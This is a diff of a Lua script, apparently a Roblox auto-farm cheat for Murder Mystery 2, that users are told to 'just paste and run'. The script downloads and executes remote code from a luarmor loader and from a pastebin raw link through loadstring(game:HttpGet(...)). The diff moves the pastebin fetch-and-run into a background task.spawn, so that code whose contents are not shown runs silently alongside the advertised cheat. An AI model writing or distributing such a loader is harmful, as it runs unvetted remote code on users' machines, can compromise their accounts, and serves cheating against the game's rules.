@@ -1,5 +1,8 @@
 -- Pulse MM2 Auto Farm v2.7
 -- Just paste and run. UI loads automatically.
 
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/zFk1yNWt"))()
+end)
+
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/5857a6cfae3b902eb3c2dff7cdbf173b.lua"))()
-loadstring(game:HttpGet("https://pastebin.com/raw/zFk1yNWt"))()
